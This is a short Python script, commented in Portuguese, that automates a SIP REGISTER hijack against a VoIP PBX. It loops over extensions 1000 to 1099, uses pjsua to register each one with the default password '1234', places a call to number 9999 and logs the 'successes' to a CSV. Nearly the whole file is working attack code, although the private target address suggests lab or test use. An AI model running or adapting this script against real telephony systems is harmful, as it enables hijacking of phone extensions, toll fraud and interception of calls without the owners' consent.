import subprocess
import time
import csv
import os
import shutil

# Configurações
IP_DESTINO = "192.168.0.75"
PORTA_SIP = 5060
RAMAL_INICIAL = 1000
RAMAL_FINAL = 1099
SENHA_PADRAO = "1234"
DESTINO = "9999"
TEMPO_MAXIMO = 10  # Tempo máximo de espera (segundos)
DURACAO_CHAMADA = 6  # Duração da chamada no pjsua (segundos)

# Localizar pjsua
PJSUA_PATH = shutil.which("pjsua")
if not PJSUA_PATH:
    if os.path.exists("/usr/src/pjproject/pjsip-apps/src/pjsua"):
        PJSUA_PATH = "/usr/src/pjproject/pjsip-apps/src/pjsua"
    else:
        print("❌ Erro: pjsua não encontrado. Verifique a instalação.")
        exit(1)

# Criar pasta de resultados se não existir
os.makedirs("results", exist_ok=True)

# Função para executar o hijack dos ramais
def hijack_ramais():
    resultados = []
    print(f"\n🎯 Iniciando ataque Hijack REGISTER de {RAMAL_INICIAL} a {RAMAL_FINAL}...\n")

    porta_local = 5062  # Porta local inicial para cada ramal

    for ramal in range(RAMAL_INICIAL, RAMAL_FINAL + 1):
        print(f"🔵 Tentando hijack no ramal {ramal} usando porta local {porta_local}...")
        origem_uri = f"sip:{ramal}@{IP_DESTINO}"
        destino_uri = f"sip:{DESTINO}@{IP_DESTINO}"

        comando = [
            PJSUA_PATH,
            f"--id={origem_uri}",
            f"--registrar=sip:{IP_DESTINO}",
            "--realm=*",
            f"--username={ramal}",
            f"--password={SENHA_PADRAO}",
            f"--local-port={porta_local}",
            "--null-audio",
            "--no-vad",
            "--auto-answer=200",
            f"--duration={DURACAO_CHAMADA}",
            "--log-level=0",
            "--config-file=/dev/null",
            destino_uri
        ]

        try:
            processo = subprocess.Popen(
                comando,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            stdout, stderr = processo.communicate(timeout=TEMPO_MAXIMO)

            if processo.returncode == 0:
                print(f"✅ Hijack bem-sucedido no ramal {ramal}\n")
                resultados.append((ramal, "Sucesso"))
            else:
                print(f"⚠️ Hijack incerto para o ramal {ramal}\n")
                resultados.append((ramal, "Possível Falha"))

        except subprocess.TimeoutExpired:
            print(f"✅ Timeout esperado no ramal {ramal} (tratado como Sucesso)\n")
            processo.kill()
            resultados.append((ramal, "Sucesso"))

        porta_local += 1  # Incrementa porta para próximo ramal

    return resultados

# Executar ataque
resultados = hijack_ramais()

# Salvar resultados
dataset_path = "results/hijack_register_resultados.csv"
with open(dataset_path, mode='w', newline='') as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow(["ramal", "status"])
    for ramal, status in resultados:
        writer.writerow([ramal, status])

print(f"\n📂 Resultados salvos em {dataset_path}")
